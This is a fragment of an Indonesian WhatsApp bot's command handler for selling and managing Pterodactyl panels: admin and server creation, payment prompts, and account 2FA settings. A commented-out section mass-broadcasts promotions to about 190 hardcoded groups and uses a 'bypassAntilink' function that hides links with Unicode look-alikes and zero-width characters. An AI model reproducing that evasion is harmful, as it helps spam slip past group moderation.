}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel-v2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break
case "cadmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 30 Haei
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await conn.sendMessage(orang, {text: teks}, {quoted: m})
}
break
case "cadmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 30 Haei
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await conn.sendMessage(orang, {text: teks}, {quoted: m})
}
break
case "listadmin": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break
//================================================================================

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break
case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break
case "pay": case "payment": case "qris": {
await conn.sendMessage(m.chat, {
footer: `© 2024 ${botname}`,
buttons: [
{
buttonId: 'action',
buttonText: { displayText: 'ini pesan interactiveMeta' },
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Pilih Payment Lain',
sections: [
{
title: 'List Payment',
rows: [
{
title: 'DANA',
id: '.dana'
},
{
title: 'OVO',
id: '.ovo'
},
{
title: 'GOPAY',
id: '.gopay'
},
{
title: 'SHOPEEPAY',
id: '.shopepay'
}
]
}
]
})
}
}
],
headerType: 1,
viewOnce: true,
image: {url: global.image.qris}, 
caption: "\n```Scan qris diatas dan jika sudah transfer mohon sertakan bukti```\n"
}, {quoted: qtext2})
}
break
case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.dana}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ovo": {
if (!isCreator) return
let teks = `
*PAYMENT OVO ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.ovo}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gopay": {
if (!isCreator) return
let teks = `
*PAYMENT GOPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.gopay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shopepay": {
if (!isCreator) return
let teks = `
*PAYMENT SHOPEPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.shopepay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break
case "listgc": case "listgrup": {
let teks = `\n *#- List all group chat*\n`
let a = await conn.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n`
for (const u of gc) {
teks += `"${u.id}",\n`
}
return m.reply(teks)
}
/*break
case "jpm": {
if (!isCreator) return Reply(mess.owner);
if (!q) return m.reply(example("teksnya"));

// Daftar grup target
const targetGroupIds = [
'120363393755407109@g.us',
'120363393714569786@g.us',
'120363380986543984@g.us',
'120363337818602883@g.us',
'120363326183473085@g.us',
'120363314471364758@g.us',
'120363304199103607@g.us',
'120363295046070261@g.us',
'120363286035357195@g.us',
'120363274807275018@g.us',
'120363263264589890@g.us',
'120363226713499462@g.us',
'120363371470487882@g.us',
'120363383438410840@g.us',
'120363381831619066@g.us',
'120363375396087355@g.us',
'120363409123021980@g.us',
'120363307942764592@g.us',
'120363396603826562@g.us',
'120363394596277483@g.us',
'120363319861194281@g.us',
'120363409680966510@g.us',
'6285366293093-1578203584@g.us',
'120363266173159906@g.us',
'120363297125293206@g.us',
'120363305165884176@g.us',
'120363279204352247@g.us',
'120363286882412186@g.us',
'120363311310330142@g.us',
'120363285660912813@g.us',
'120363300476258859@g.us',
'120363262251538602@g.us',
'120363262652493213@g.us',
'120363194059470640@g.us',
'120363246039762918@g.us',
'120363255638726606@g.us',
'120363310658766090@g.us',
'120363295970546398@g.us',
'120363196709008764@g.us',
'120363283458882185@g.us',
'120363203426508059@g.us',
'120363223423380625@g.us',
'120363201371856055@g.us',
'120363277208393303@g.us',
'120363227940201582@g.us',
'120363294604196087@g.us',
'120363299959214622@g.us',
'120363028085098814@g.us',
'120363139848781263@g.us',
'120363301713830876@g.us',
'120363244587475389@g.us',
'120363235623211474@g.us',
'120363227400142807@g.us',
'120363281967660377@g.us',
'120363266466259150@g.us',
'120363295374489979@g.us',
'120363310671580226@g.us',
'120363279955538255@g.us',
'120363362676649289@g.us',
'120363291716309285@g.us',
'120363192883996118@g.us',
'120363286132324926@g.us',
'120363310194838684@g.us',
'120363173930121366@g.us',
'120363182798245876@g.us',
'120363150666761635@g.us',
'120363339557468900@g.us',
'120363209562006259@g.us',
'120363289167163956@g.us',
'120363163489708066@g.us',
'120363280499400543@g.us',
'120363197032632502@g.us',
'120363268351062123@g.us',
'120363281854681962@g.us',
'120363190151658672@g.us',
'120363203483340243@g.us',
'120363277813900668@g.us',
'120363303066132343@g.us',
'120363234827646466@g.us',
'120363162705427037@g.us',
'120363242617791857@g.us',
'120363226047493606@g.us',
'120363193645274458@g.us',
'120363291696577522@g.us',
'120363239640448691@g.us',
'120363364453721951@g.us',
'120363336407118534@g.us',
'120363276315347246@g.us',
'120363371682199027@g.us',
'120363302885823987@g.us',
'120363313940341729@g.us',
'120363263233984809@g.us',
'120363181998053293@g.us',
'120363307885226187@g.us',
'120363377632717511@g.us',
'120363343760328602@g.us',
'120363206490913284@g.us',
'120363294461056006@g.us',
'120363297665192462@g.us',
'6285709493006-1569564645@g.us',
'120363176015696062@g.us',
'120363298660481407@g.us',
'120363302988261159@g.us',
'120363176864127682@g.us',
'120363252498599222@g.us',
'120363282847151112@g.us',
'120363381401846648@g.us',
'120363282926258875@g.us',
'120363322897770255@g.us',
'120363217317151495@g.us',
'120363163367675087@g.us',
'120363305902339427@g.us',
'120363337385729283@g.us',
'6281413517251-1612009768@g.us',
'120363209124542239@g.us',
'120363259074490752@g.us',
'120363296544098292@g.us',
'120363198014449393@g.us',
'120363286169728533@g.us',
'120363318406880422@g.us',
'120363359005787677@g.us',
'120363287023535385@g.us',
'120363348490772876@g.us',
'120363145776407671@g.us',
'120363262841806151@g.us',
'120363199834649652@g.us',
'120363201037385966@g.us',
'120363211058685803@g.us',
'120363260680769991@g.us',
'120363304732164894@g.us',
'120363299414094712@g.us',
'120363299956822058@g.us',
'120363237967081955@g.us',
'120363280204351830@g.us',
'120363325774913517@g.us',
'120363252317767209@g.us',
'120363352127845231@g.us',
'120363226883828135@g.us',
'120363314367350250@g.us',
'6281233771886-1595939303@g.us',
'120363289329896375@g.us',
'120363354074277447@g.us',
'120363333561167424@g.us',
'120363275223233312@g.us',
'120363373505778130@g.us',
'120363189227036070@g.us',
'120363024363258128@g.us',
'120363373742802001@g.us',
'120363235320780899@g.us',
'120363319491190538@g.us',
'120363280879265754@g.us',
'120363163463596253@g.us',
'120363267389573149@g.us',
'120363090384059273@g.us',
'120363041514443149@g.us',
'120363145600396887@g.us',
'120363289050896417@g.us',
'120363321077623508@g.us',
'120363291157713210@g.us',
'120363165676528693@g.us',
'120363307524763421@g.us',
'120363221733252907@g.us',
'120363315432448817@g.us',
'120363381475972410@g.us',
'120363024747735358@g.us',
'120363326528745841@g.us',
'120363321852196066@g.us',
'120363299987016721@g.us',
'120363328038369986@g.us',
'120363022944135011@g.us',
'120363338719910258@g.us',
'120363323285395488@g.us',
'120363168762429568@g.us',
'120363392199937046@g.us',
'120363293573148519@g.us',
'120363203362158009@g.us',
'120363390381529728@g.us',
'120363331175428040@g.us',
'120363186718984270@g.us',
'120363277536433260@g.us',
'120363235734572216@g.us',
'120363136024882508@g.us',
'120363048476766634@g.us',
'120363044608010651@g.us',
'120363298096250409@g.us',
'120363362779916890@g.us',
'120363143288529142@g.us',
'120363270263843099@g.us',
'120363261964094659@g.us',
'120363288769564494@g.us'
];


// Fungsi untuk memodifikasi link agar tidak terdeteksi antilink
const bypassAntilink = (text) => {
return text
.replace(/chat.whatsapp.com/g, 'chat.whatsapp․com') // Ganti titik dengan Unicode
.replace(/t.me/g, 't․me') // Ganti titik dengan Unicode
.replace(/\//g, '\u200B/'); // Sisipkan zero-width character sebelum '/'
};

let count = 0;
const jid = m.chat;
const teks = bypassAntilink(q); // Modifikasi link dalam teks agar tidak terdeteksi

await m.reply(`Memproses *JPM* teks ke ${targetGroupIds.length} grup...`);

for (let groupId of targetGroupIds) {
if (global.db.groups[groupId] && global.db.groups[groupId].blacklistjpm && global.db.groups[groupId].blacklistjpm == true) continue;

try {
await conn.sendMessage(groupId, { text: `${teks}` }, { quoted: qlocJpm });
count += 1;
} catch (e) {
console.log(`Gagal mengirim ke ${groupId}:`, e);
}

await sleep(global.delayJpm);
}

await conn.sendMessage(jid, { text: `*JPM Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}` }, { quoted: m });
}
break;
case "testi": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))

// Your array of specific group IDs
const targetGroupIds = [
'120363393755407109@g.us',
'120363393714569786@g.us',
'120363380986543984@g.us',
'120363337818602883@g.us',
'120363326183473085@g.us',
'120363314471364758@g.us',
'120363304199103607@g.us',
'120363295046070261@g.us',
'120363286035357195@g.us',
'120363274807275018@g.us',
'120363263264589890@g.us',
'120363226713499462@g.us',
'120363371470487882@g.us',
'120363383438410840@g.us',
'120363381831619066@g.us',
'120363375396087355@g.us',
'120363409123021980@g.us',
'120363307942764592@g.us',
'120363396603826562@g.us',
'120363394596277483@g.us',
'120363319861194281@g.us',
'120363409680966510@g.us',
'6285366293093-1578203584@g.us',
'120363266173159906@g.us',
'120363297125293206@g.us',
'120363305165884176@g.us',
'120363279204352247@g.us',
'120363286882412186@g.us',
'120363311310330142@g.us',
'120363285660912813@g.us',
'120363300476258859@g.us',
'120363262251538602@g.us',
'120363262652493213@g.us',
'120363194059470640@g.us',
'120363246039762918@g.us',
'120363255638726606@g.us',
'120363310658766090@g.us',
'120363295970546398@g.us',
'120363196709008764@g.us',
'120363283458882185@g.us',
'120363203426508059@g.us',
'120363223423380625@g.us',
'120363201371856055@g.us',
'120363277208393303@g.us',
'120363227940201582@g.us',
'120363294604196087@g.us',
'120363299959214622@g.us',
'120363028085098814@g.us',
'120363139848781263@g.us',
'120363301713830876@g.us',
'120363244587475389@g.us',
'120363235623211474@g.us',
'120363227400142807@g.us',
'120363281967660377@g.us',
'120363266466259150@g.us',
'120363295374489979@g.us',
'120363310671580226@g.us',
'120363279955538255@g.us',
'120363362676649289@g.us',
'120363291716309285@g.us',
'120363192883996118@g.us',
'120363286132324926@g.us',
'120363310194838684@g.us',
'120363173930121366@g.us',
'120363182798245876@g.us',
'120363150666761635@g.us',
'120363339557468900@g.us',
'120363209562006259@g.us',
'120363289167163956@g.us',
'120363163489708066@g.us',
'120363280499400543@g.us',
'120363197032632502@g.us',
'120363268351062123@g.us',
'120363281854681962@g.us',
'120363190151658672@g.us',
'120363203483340243@g.us',
'120363277813900668@g.us',
'120363303066132343@g.us',
'120363234827646466@g.us',
'120363162705427037@g.us',
'120363242617791857@g.us',
'120363226047493606@g.us',
'120363193645274458@g.us',
'120363291696577522@g.us',
'120363239640448691@g.us',
'120363364453721951@g.us',
'120363336407118534@g.us',
'120363276315347246@g.us',
'120363371682199027@g.us',
'120363302885823987@g.us',
'120363313940341729@g.us',
'120363263233984809@g.us',
'120363181998053293@g.us',
'120363307885226187@g.us',
'120363377632717511@g.us',
'120363343760328602@g.us',
'120363206490913284@g.us',
'120363294461056006@g.us',
'120363297665192462@g.us',
'6285709493006-1569564645@g.us',
'120363176015696062@g.us',
'120363298660481407@g.us',
'120363302988261159@g.us',
'120363176864127682@g.us',
'120363252498599222@g.us',
'120363282847151112@g.us',
'120363381401846648@g.us',
'120363282926258875@g.us',
'120363322897770255@g.us',
'120363217317151495@g.us',
'120363163367675087@g.us',
'120363305902339427@g.us',
'120363337385729283@g.us',
'6281413517251-1612009768@g.us',
'120363209124542239@g.us',
'120363259074490752@g.us',
'120363296544098292@g.us',
'120363198014449393@g.us',
'120363286169728533@g.us',
'120363318406880422@g.us',
'120363359005787677@g.us',
'120363287023535385@g.us',
'120363348490772876@g.us',
'120363145776407671@g.us',
'120363262841806151@g.us',
'120363199834649652@g.us',
'120363201037385966@g.us',
'120363211058685803@g.us',
'120363260680769991@g.us',
'120363304732164894@g.us',
'120363299414094712@g.us',
'120363299956822058@g.us',
'120363237967081955@g.us',
'120363280204351830@g.us',
'120363325774913517@g.us',
'120363252317767209@g.us',
'120363352127845231@g.us',
'120363226883828135@g.us',
'120363314367350250@g.us',
'6281233771886-1595939303@g.us',
'120363289329896375@g.us',
'120363354074277447@g.us',
'120363333561167424@g.us',
'120363275223233312@g.us',
'120363373505778130@g.us',
'120363189227036070@g.us',
'120363024363258128@g.us',
'120363373742802001@g.us',
'120363235320780899@g.us',
'120363319491190538@g.us',
'120363280879265754@g.us',
'120363163463596253@g.us',
'120363267389573149@g.us',
'120363090384059273@g.us',
'120363041514443149@g.us',
'120363145600396887@g.us',
'120363289050896417@g.us',
'120363321077623508@g.us',
'120363291157713210@g.us',
'120363165676528693@g.us',
'120363307524763421@g.us',
'120363221733252907@g.us',
'120363315432448817@g.us',
'120363381475972410@g.us',
'120363024747735358@g.us',
'120363326528745841@g.us',
'120363321852196066@g.us',
'120363299987016721@g.us',
'120363328038369986@g.us',
'120363022944135011@g.us',
'120363338719910258@g.us',
'120363323285395488@g.us',
'120363168762429568@g.us',
'120363392199937046@g.us',
'120363293573148519@g.us',
'120363203362158009@g.us',
'120363390381529728@g.us',
'120363331175428040@g.us',
'120363186718984270@g.us',
'120363277536433260@g.us',
'120363235734572216@g.us',
'120363136024882508@g.us',
'120363048476766634@g.us',
'120363044608010651@g.us',
'120363298096250409@g.us',
'120363362779916890@g.us',
'120363143288529142@g.us',
'120363270263843099@g.us',
'120363261964094659@g.us',
'120363288769564494@g.us'
];

let count = 0
let failed = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)

await m.reply(`Memproses *jpm* testimoni ke ${targetGroupIds.length} grup`)

for (let groupId of targetGroupIds) {
if (global.db.groups[groupId] && global.db.groups[groupId].blacklistjpm && global.db.groups[groupId].blacklistjpm == true) {
continue
}

try {
await conn.sendMessage(groupId, {
image: await fs.readFileSync(rest), 
caption: teks, 
contextInfo: { 
isForwarded: true, 
mentionedJid: [m.sender], 
businessMessageForwardInfo: { 
businessOwnerJid: "-! Fahri - OfficiaL Marketpalce"
}, 
forwardedNewsletterMessageInfo: { 
newsletterName: "-! Fahri - OfficiaL Marketpalce" , 
newsletterJid: "120363251918335834@newsletter" 
}
}
}, {quoted: m})

count += 1
console.log(`Successfully sent to group: ${groupId}`)
} catch (error) {
failed += 1
console.error(`Failed to send to group ${groupId}:`, error?.message || "Unknown error")
}

await sleep(global.delayJpm)
}

await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `*Jpm Testimoni Report ✅*\n\nTotal groups: ${targetGroupIds.length}\nSuccessful: ${count}\nFailed: ${failed}`}, {quoted: m})
}
break
*/
//~~~~~~~~~~~ | Fitur Ai Edit Script | ~~~~~~~~~~//
case 'editscript': {
if (!m.quoted || !m.quoted.message || !m.quoted.message.documentMessage) return m.reply('Reply ke file .js yang ingin diedit.');

const alasan = text || '';
const mime = m.quoted.message.documentMessage.mimetype || '';
const fileName = m.quoted.message.documentMessage.fileName || 'script.js';

if (!/octet-stream|javascript/.test(mime))return m.reply('File harus berupa dokumen JavaScript (.js)');

let buffer;
try {
buffer = await m.quoted.download();
} catch (err) {
return m.reply('Gagal download file');
}

const originalScript = buffer.toString();
const fs = require('fs');
const axios = require('axios');

let response;
try {
response = await axios.post('https://openrouter.ai/api/v1/chat/completions', {
model: "mistralai/mistral-7b-instruct", // model gratis
messages: [
{
role: "system",
content: "Kamu adalah asisten coding. Jangan ubah struktur kode. Fokus hanya pada bagian yang diminta user dalam alasan."
},
{
role: "user",
content: `Ini alasannya: "${alasan}".\n\nBerikut isi script:\n\n${originalScript}\n\nTolong edit sesuai alasan di atas, tanpa mengubah bagian lain, dan tanpa tambahan teks di luar kode.`
}
]
}, {
headers: {
'Authorization': `Bearer ${global.openai}`, // Ganti dengan API Key OpenRouter kamu
'Content-Type': 'application/json'
}
});
} catch (e) {
console.error(e?.response?.data || e);
return m.reply('Gagal terhubung ke OpenRouter. Cek API Key atau model.');
}

let hasil = response.data.choices[0].message.content;

// Bersihkan hasil dari tambahan markdown dan basa-basi
hasil = hasil
.replace(/```(?:\w+)?/g, '') // hapus ``` dan ```js
.replace(/Terima kasih.*?(\n|$)/gi, '') // hapus kata terima kasih
.trim();

const outPath = './source/' + fileName;
fs.writeFileSync(outPath, hasil);

await conn.sendMessage(m.chat, {
document: { url: outPath },
fileName: fileName,
mimetype: 'application/javascript'
}, { quoted: m });

m.reply('✅ Script berhasil diedit dengan bantuan AI (tanpa tambahan teks aneh).');
break;
}
//~~~~~~~~~~~ Pterodactyl Terbaru ~~~~~~~~~//
case "accountpterodactyl": {
if (!isCreator) return m.reply("Khusus owner!");
try {
const axios = require('axios');
const response = await axios.get(`${global.domain}/api/client/account`, {
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.capikey}`
// GAK PERLU COOKIE
}
});

const data = response.data.attributes;
const teks = `
*Informasi Akun Pterodactyl*
• Username: ${data.username}
• Nama: ${data.first_name} ${data.last_name}
• Email: ${data.email}
• Bahasa: ${data.language}
• Admin: ${data.admin ? "✅" : "❌"}
`.trim();

conn.sendMessage(m.chat, { text: teks }, { quoted: qtext2 });
} catch (err) {
let errorMsg = err.response?.data || err.message;
conn.sendMessage(m.chat, { text: `Gagal mengambil data akun:\n${JSON.stringify(errorMsg, null, 2)}` }, { quoted: qtext2 });
}
}
break
case "aktif2fa": {
if (!isCreator) return m.reply("Khusus owner!");
let [password, totpCode] = text.split(" ");
if (!password || !totpCode) return m.reply("Contoh: *.aktif2fa password 123456*");

try {
const axios = require('axios');
const res = await axios.post(
`${global.domain}/api/client/account/two-factor`, 
{ 
password: password,
code: totpCode 
}, 
{ 
headers: { 
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.capikey}` 
}
}
);

let tokens = res.data.attributes.tokens.map((t, i) => `${i+1}. ${t}`).join('\n');
let teks = `
✅ *2FA Berhasil Diaktifkan!*

Berikut kode recovery kamu (catat di tempat aman):

${tokens}
`.trim();

conn.sendMessage(m.chat, { text: teks }, { quoted: qtext2 });

} catch (err) {
let msg = err.response?.data?.errors?.[0]?.detail || err.message;
conn.sendMessage(m.chat, { text: `Gagal mengaktifkan 2FA:\n${msg}` }, { quoted: qtext2 });
}
}
break;
case "qr2fa": {
if (!isCreator) return m.reply("Khusus owner!");
try {
const axios = require('axios');
const res = await axios.get(`${global.domain}/api/client/account/two-factor`, {
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.capikey}`
}
});

let otpUrl = res.data.data.image_url_data;
let qrLink = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(otpUrl)}&size=300x300`;

let teks = `
✅ *QR Code 2FA*

Silakan scan QR ini dengan Google Authenticator atau aplikasi sejenis.

Kalau gagal scan, bisa pakai link manual:
\`\`\`${otpUrl}\`\`\`
`.trim();

await conn.sendMessage(m.chat, { image: { url: qrLink }, caption: teks }, { quoted: qtext2 });
} catch (err) {
let msg = err.response?.data?.errors?.[0]?.detail || err.message;
conn.sendMessage(m.chat, { text: `Gagal ambil QR 2FA:\n${msg}` }, { quoted: qtext2 });
}}
break
case "matikan2fa": {
if (!isCreator) return m.reply("Khusus owner!");
if (!text) return m.reply(`Masukkan password akun Pterodactyl\n\nContoh:\n.matikan2fa passwordgue`);
try {
const axios = require("axios");
const res = await axios.post(`${global.domain}/api/client/account/two-factor/disable`, {
password: text
}, {
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.capikey}`
}
});

m.reply("✅ 2FA berhasil dinonaktifkan.");
} catch (err) {
let msg = err.response?.data?.errors?.[0]?.detail || err.message;
m.reply(`❌ Gagal menonaktifkan 2FA:\n${msg}`);
}
}
break;
case "updateemail": {
if (!isCreator) return m.reply("Khusus owner!");
if (!text.includes("|")) return m.reply(`Format salah!\n\nContoh:\n.gantiemail emailbaru@example.com|passwordlama`);

const [newEmail, password] = text.split("|");
try {
const axios = require("axios");
const res = await axios.put(`${global.domain}/api/client/account/email`, {
email: newEmail.trim(),
password: password.trim()
}, {
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.capikey}`
}
});

m.reply("*✅ Email berhasil diubah.*");
} catch (err) {
let msg = err.response?.data?.errors?.[0]?.detail || err.message;
m.reply(`❌ Gagal mengubah email:\n${msg}`);
}
}
break;
case "updatepw": {
if (!isCreator) return m.reply("Khusus owner!");

if (!text.includes("|")) return m.reply(`Format salah!\n\nContoh:\n.gantipassword passwordlama|passwordbaru|passwordbaru`);

const [currentPassword, newPassword, confirmPassword] = text.split("|");
if (newPassword !== confirmPassword) {
return m.reply("❌ Password baru dan konfirmasi password tidak cocok.");
}

try {
const axios = require("axios");
const res = await axios.put(`${global.domain}/api/client/account/password`, {
current_password: currentPassword.trim(),
password: newPassword.trim(),
password_confirmation: confirmPassword.trim()
}, {
headers: {
'Accept': 'application/json',
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.capikey}`
}
});

m.reply("✅ Password berhasil diubah.");
} catch (err) {
let msg = err.response?.data?.errors?.[0]?.detail || err.message;
m.reply(`❌ Gagal mengubah password:\n${msg}`);
}}
break;
case "listservers": {
if (!isCreator) return m.reply("❌ Khusus owner!");
try {
const axios = require("axios");
const res = await axios.get(`${global.domain}/api/client`, {
headers: {
'Accept': 'application/json',
'Authorization': `Bearer ${global.capikey}`,
},
});
const servers = res.data.data;
if (servers.length === 0) return m.reply("❌ Tidak ada server yang terdaftar.");

let message = "📋 Daftar Server:\n";
servers.forEach(server => {
const serverInfo = server.attributes;
message += `\n🔹 *${serverInfo.name}* (ID: ${serverInfo.identifier})\n`;
message += `- Owner: ${serverInfo.server_owner ? 'Ya' : 'Tidak'}\n`;
message += `- Deskripsi: ${serverInfo.description || 'Tidak ada deskripsi'}\n`;
message += `- Node: ${serverInfo.node}\n`;
message += `- IP: ${serverInfo.sftp_details.ip}:${serverInfo.sftp_details.port}\n`;
message += `- Status: ${serverInfo.is_suspended ? 'Suspended' : 'Aktif'}\n`;
message += `- Memori: ${serverInfo.limits.memory} MB\n`;
message += `- Disk: ${serverInfo.limits.disk} MB\n`;
message += `- CPU: ${serverInfo.limits.cpu}%\n`;

if (serverInfo.relationships.allocations) {
serverInfo.relationships.allocations.data.forEach(allocation => {
message += `- Port: ${allocation.attributes.port} (${allocation.attributes.is_default ? 'Default' : 'Non-default'})\n`;
if (allocation.attributes.notes) {
message += `Catatan: ${allocation.attributes.notes}\n`;
}
});
}
message += "\n----------------------\n";
});
m.reply(message);
} catch (err) {
const errorMsg = err.response?.data?.errors?.[0]?.detail || err.message;
m.reply(`❌ Gagal mengambil daftar server:\n${errorMsg}`);
}
}
break;
case "buypanel": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return conn.sendMessage(m.chat, {
  text: `Pilih Ram Server Panel Yang Tersedia

*List Ram Server Panel:*

• Ram 1GB - Rp1.000
  Ketik: .buypanel 1gb
  
